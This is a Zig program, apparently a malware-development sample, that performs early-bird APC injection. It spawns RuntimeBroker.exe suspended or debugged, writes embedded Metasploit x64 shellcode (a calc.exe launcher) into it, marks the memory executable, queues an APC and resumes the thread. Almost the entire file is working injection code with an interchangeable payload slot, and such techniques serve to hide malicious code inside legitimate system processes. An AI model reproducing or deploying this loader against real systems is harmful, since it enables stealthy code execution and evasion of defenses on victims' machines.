const std = @import("std");
const windows = std.os.windows;
const print = std.debug.print;

// Constants
const TARGET_PROCESS = "RuntimeBroker.exe";
const MAX_PATH = 260;

// x64 calc metasploit shellcode
const Payload = [_]u8{
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
    0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
    0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
    0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
    0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
    0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
    0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
    0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
    0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
    0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
    0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
    0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
    0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
    0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
    0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
    0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00,
};

// Define missing Windows structures
const STARTUPINFO = extern struct {
    cb: windows.DWORD,
    lpReserved: ?windows.LPWSTR,
    lpDesktop: ?windows.LPWSTR,
    lpTitle: ?windows.LPWSTR,
    dwX: windows.DWORD,
    dwY: windows.DWORD,
    dwXSize: windows.DWORD,
    dwYSize: windows.DWORD,
    dwXCountChars: windows.DWORD,
    dwYCountChars: windows.DWORD,
    dwFillAttribute: windows.DWORD,
    dwFlags: windows.DWORD,
    wShowWindow: windows.WORD,
    cbReserved2: windows.WORD,
    lpReserved2: ?*windows.BYTE,
    hStdInput: ?windows.HANDLE,
    hStdOutput: ?windows.HANDLE,
    hStdError: ?windows.HANDLE,
};

const PROCESS_INFORMATION = extern struct {
    hProcess: windows.HANDLE,
    hThread: windows.HANDLE,
    dwProcessId: windows.DWORD,
    dwThreadId: windows.DWORD,
};

const SECURITY_ATTRIBUTES = extern struct {
    nLength: windows.DWORD,
    lpSecurityDescriptor: ?*anyopaque,
    bInheritHandle: windows.BOOL,
};

// Process creation method enum
const ProcessCreationMethod = enum {
    CREATE_SUSPENDED,
    DEBUG_PROCESS,
};

// Windows API declarations
extern "kernel32" fn VirtualAllocEx(
    hProcess: windows.HANDLE,
    lpAddress: ?*anyopaque,
    dwSize: usize,
    flAllocationType: windows.DWORD,
    flProtect: windows.DWORD,
) callconv(windows.WINAPI) ?*anyopaque;

extern "kernel32" fn WriteProcessMemory(
    hProcess: windows.HANDLE,
    lpBaseAddress: *anyopaque,
    lpBuffer: *const anyopaque,
    nSize: usize,
    lpNumberOfBytesWritten: ?*usize,
) callconv(windows.WINAPI) windows.BOOL;

extern "kernel32" fn VirtualProtectEx(
    hProcess: windows.HANDLE,
    lpAddress: *anyopaque,
    dwSize: usize,
    flNewProtect: windows.DWORD,
    lpflOldProtect: *windows.DWORD,
) callconv(windows.WINAPI) windows.BOOL;

extern "kernel32" fn GetEnvironmentVariableA(
    lpName: [*:0]const u8,
    lpBuffer: [*]u8,
    nSize: windows.DWORD,
) callconv(windows.WINAPI) windows.DWORD;

extern "kernel32" fn CreateProcessA(
    lpApplicationName: ?[*:0]const u8,
    lpCommandLine: ?[*:0]u8,
    lpProcessAttributes: ?*SECURITY_ATTRIBUTES,
    lpThreadAttributes: ?*SECURITY_ATTRIBUTES,
    bInheritHandles: windows.BOOL,
    dwCreationFlags: windows.DWORD,
    lpEnvironment: ?*anyopaque,
    lpCurrentDirectory: ?[*:0]const u8,
    lpStartupInfo: *STARTUPINFO,
    lpProcessInformation: *PROCESS_INFORMATION,
) callconv(windows.WINAPI) windows.BOOL;

extern "kernel32" fn QueueUserAPC(
    pfnAPC: *const fn (*anyopaque) callconv(windows.WINAPI) void,
    hThread: windows.HANDLE,
    dwData: usize,
) callconv(windows.WINAPI) windows.DWORD;

extern "kernel32" fn DebugActiveProcessStop(
    dwProcessId: windows.DWORD,
) callconv(windows.WINAPI) windows.BOOL;

extern "kernel32" fn ResumeThread(
    hThread: windows.HANDLE,
) callconv(windows.WINAPI) windows.DWORD;

// Constants for Windows API
const MEM_COMMIT = 0x1000;
const MEM_RESERVE = 0x2000;
const PAGE_READWRITE = 0x04;
const PAGE_EXECUTE_READWRITE = 0x40;
const DEBUG_PROCESS = 0x00000001;
const CREATE_SUSPENDED = 0x00000004;

// Helper function to check if handle is valid
fn isValidHandle(handle: windows.HANDLE) bool {
    return @intFromPtr(handle) != 0 and @intFromPtr(handle) != ~@as(usize, 0);
}

/// inject the input payload into 'hProcess' and return the base address of where did the payload got written
fn injectShellcodeToRemoteProcess(
    hProcess: windows.HANDLE,
    pShellcode: []const u8,
    ppAddress: *?*anyopaque,
) bool {
    var sNumberOfBytesWritten: usize = 0;
    var dwOldProtection: windows.DWORD = 0;

    ppAddress.* = VirtualAllocEx(
        hProcess,
        null,
        pShellcode.len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );

    if (ppAddress.* == null) {
        print("\n\t[!] VirtualAllocEx Failed With Error : {d} \n", .{windows.kernel32.GetLastError()});
        return false;
    }
    print("\n\t[i] Allocated Memory At : 0x{X} \n", .{@intFromPtr(ppAddress.*.?)});

    waitForEnter("\t[#] Press <Enter> To Write Payload ... ");

    if (WriteProcessMemory(
        hProcess,
        ppAddress.*.?,
        pShellcode.ptr,
        pShellcode.len,
        &sNumberOfBytesWritten,
    ) == 0 or sNumberOfBytesWritten != pShellcode.len) {
        print("\n\t[!] WriteProcessMemory Failed With Error : {d} \n", .{windows.kernel32.GetLastError()});
        return false;
    }
    print("\t[i] Successfully Written {d} Bytes\n", .{sNumberOfBytesWritten});

    if (VirtualProtectEx(
        hProcess,
        ppAddress.*.?,
        pShellcode.len,
        PAGE_EXECUTE_READWRITE,
        &dwOldProtection,
    ) == 0) {
        print("\n\t[!] VirtualProtectEx Failed With Error : {d} \n", .{windows.kernel32.GetLastError()});
        return false;
    }

    return true;
}

/// Creates a new process 'lpProcessName' in suspended state and return its pid, handle, and the handle of its main thread
fn createSuspendedProcess2(
    lpProcessName: [*:0]const u8,
    dwProcessId: *windows.DWORD,
    hProcess: *windows.HANDLE,
    hThread: *windows.HANDLE,
    method: ProcessCreationMethod,
) bool {
    var lpPath: [MAX_PATH * 2]u8 = undefined;
    var WnDr: [MAX_PATH]u8 = undefined;

    var Si: STARTUPINFO = undefined;
    var Pi: PROCESS_INFORMATION = undefined;

    // cleaning the structs (using Zig's built-in memory functions)
    @memset(std.mem.asBytes(&Si), 0);
    @memset(std.mem.asBytes(&Pi), 0);

    // setting the size of the structure
    Si.cb = @sizeOf(STARTUPINFO);

    // Getting the %WINDIR% environment variable path (this is usually 'C:\Windows')
    if (GetEnvironmentVariableA("WINDIR", &WnDr, MAX_PATH) == 0) {
        print("[!] GetEnvironmentVariableA Failed With Error : {d} \n", .{windows.kernel32.GetLastError()});
        return false;
    }

    // Creating the target process path
    const formatted = std.fmt.bufPrintZ(&lpPath, "{s}\\System32\\{s}", .{ WnDr[0..std.mem.indexOfScalar(u8, &WnDr, 0).?], std.mem.span(lpProcessName) }) catch {
        print("[!] Failed to format path\n", .{});
        return false;
    };

    // Use runtime switch with var instead of const
    var creation_flags: windows.DWORD = undefined;
    var method_name: []const u8 = undefined;

    switch (method) {
        .CREATE_SUSPENDED => {
            creation_flags = CREATE_SUSPENDED;
            method_name = "Suspended";
        },
        .DEBUG_PROCESS => {
            creation_flags = DEBUG_PROCESS;
            method_name = "Debugged";
        },
    }

    print("\n\t[i] Running : \"{s}\" as {s} Process ... ", .{ formatted, method_name });

    if (CreateProcessA(
        null,
        @constCast(formatted.ptr),
        null,
        null,
        0, // FALSE
        creation_flags,
        null,
        null,
        &Si,
        &Pi,
    ) == 0) {
        print("[!] CreateProcessA Failed with Error : {d} \n", .{windows.kernel32.GetLastError()});
        return false;
    }

    print("[+] DONE \n", .{});

    // Populating the OUTPUT parameter with 'CreateProcessA's output'
    dwProcessId.* = Pi.dwProcessId;
    hProcess.* = Pi.hProcess;
    hThread.* = Pi.hThread;

    // Doing a check to verify we got everything we need
    if (dwProcessId.* != 0 and isValidHandle(hProcess.*) and isValidHandle(hThread.*))
        return true;

    return false;
}

fn resumeProcess(dwProcessId: windows.DWORD, hThread: windows.HANDLE, method: ProcessCreationMethod) void {
    switch (method) {
        .CREATE_SUSPENDED => {
            print("[i] Resuming The Target Process Thread ... ", .{});
            const result = ResumeThread(hThread);
            if (result == ~@as(windows.DWORD, 0)) {
                print("[!] ResumeThread Failed With Error : {d} \n", .{windows.kernel32.GetLastError()});
            } else {
                print("[+] DONE \n\n", .{});
            }
        },
        .DEBUG_PROCESS => {
            print("[i] Detaching The Target Process ... ", .{});
            _ = DebugActiveProcessStop(dwProcessId);
            print("[+] DONE \n\n", .{});
        },
    }
}

fn waitForEnter(message: []const u8) void {
    print("{s}", .{message});
    var buffer: [256]u8 = undefined;
    _ = std.io.getStdIn().reader().readUntilDelimiterOrEof(buffer[0..], '\n') catch {};
}

fn getUserChoice() !ProcessCreationMethod {
    const stdin = std.io.getStdIn().reader();
    var buffer: [256]u8 = undefined;

    print("\n[?] Choose Process Creation Flag:\n", .{});
    print("    [1] CREATE_SUSPENDED\n", .{});
    print("    [2] DEBUG_PROCESS\n", .{});
    print("[>] Enter your choice (1 or 2): ", .{});

    while (true) {
        if (try stdin.readUntilDelimiterOrEof(buffer[0..], '\n')) |input| {
            const trimmed = std.mem.trim(u8, input, " \t\r\n");

            if (std.mem.eql(u8, trimmed, "1")) {
                return ProcessCreationMethod.CREATE_SUSPENDED;
            } else if (std.mem.eql(u8, trimmed, "2")) {
                return ProcessCreationMethod.DEBUG_PROCESS;
            } else {
                print("[!] Invalid choice. Please enter 1 or 2: ", .{});
            }
        } else {
            print("[!] Failed to read input. Please try again: ", .{});
        }
    }
}

pub fn main() !void {
    var hProcess: windows.HANDLE = undefined;
    var hThread: windows.HANDLE = undefined;
    var dwProcessId: windows.DWORD = 0;
    var pAddress: ?*anyopaque = null;

    // Get user's choice for process creation method
    const creation_method = try getUserChoice();

    const method_name = switch (creation_method) {
        .CREATE_SUSPENDED => "Suspended",
        .DEBUG_PROCESS => "Debugged",
    };

    // creating target remote process (in suspended/debugged state)
    print("\n[i] Creating \"{s}\" Process As A {s} Process ... ", .{ TARGET_PROCESS, method_name });
    if (!createSuspendedProcess2(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread, creation_method)) {
        return;
    }
    print("\t[i] Target Process Created With Pid : {d} \n", .{dwProcessId});
    print("[+] DONE \n\n", .{});

    // injecting the payload and getting the base address of it
    print("[i] Writing Shellcode To The Target Process ... ", .{});
    if (!injectShellcodeToRemoteProcess(hProcess, &Payload, &pAddress)) {
        return;
    }
    print("[+] DONE \n\n", .{});

    // running QueueUserAPC
    print("[i] Queueing APC to target thread ... ", .{});
    _ = QueueUserAPC(
        @ptrCast(pAddress.?),
        hThread,
        0,
    );
    print("[+] DONE \n\n", .{});

    waitForEnter("[#] Press <Enter> To Run Shellcode ... ");

    // Resume process execution based on the creation method
    resumeProcess(dwProcessId, hThread, creation_method);

    waitForEnter("[#] Press <Enter> To Quit ... ");

    windows.CloseHandle(hProcess);
    windows.CloseHandle(hThread);
}
